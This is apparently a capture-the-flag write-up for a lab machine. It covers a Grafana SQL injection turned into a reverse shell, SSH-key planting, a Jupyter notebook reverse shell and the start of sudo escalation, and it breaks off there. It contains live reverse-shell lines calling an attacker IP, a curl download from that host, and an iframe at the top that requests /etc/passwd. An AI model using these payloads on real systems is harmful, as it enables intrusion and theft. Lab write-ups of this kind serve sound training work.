---
layout: post
title: "From SQLi to Root"
date: 2023-10-15
---

<iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px></iframe>

# Enumeration 
IP: 
```shell
10.10.11.233
```
Ports:
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Found Grafana Dashboard - `Grafana v9.5.2 (cfcea75916)`

## Reverse Shell

```shell
nc -lvnp 6969
```

### SQL Exploit 
``"CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.16.5/6969 0>&1\"'"``

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


``ls -ls /tmp/bash``

``./bash -p``

## Copy ssh keys to victim machine
Generate new keys https://linuxhandbook.com/add-ssh-public-key-to-server/

On the Offensive machine - 
```shell
 ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
```

```shell
python3 -m http.server
```

On the Victim's machine 
```shell
curl -O http://10.10.16.5:8000/id_rsa.pub

#then 

mv id_rsa.pub authorized_keys
```

On the Attackers machine 
```shell
ssh -i id_rsa juno@10.10.11.216
```

Success found user.txt!!!!

---
# Root Flag
Running `cat shadow-simulation.sh`
```bash
#!/bin/bash
cd /dev/shm
rm -rf /dev/shm/shadow.data
/home/juno/.local/bin/shadow /dev/shm/*.yml
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
```

# **Pivoting : Juno → jovian**

In user shell I type ``netstat -nptl`` command to list all active port running internally in that Machine.

```shell
ssh -i id_rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216
```
This command will forward that port(8888) in my machine. And I can easily access that. :)

navigating to `localhost:8888` with my browser I found a Jupyter labs notebook


TIp `cat *| grep "token"`

After logging in with the token I was able to edit the python notebook and add a reverse shell.
```python
import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.5/6969 0>&1\"')
```
Success

## Privilege escalation Jovian -> root
```shell
sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```
Find all config.json files
```shell
find / -name config.json 2>/dev/null
```

Found `/usr/local/share/sattrack/config.json`
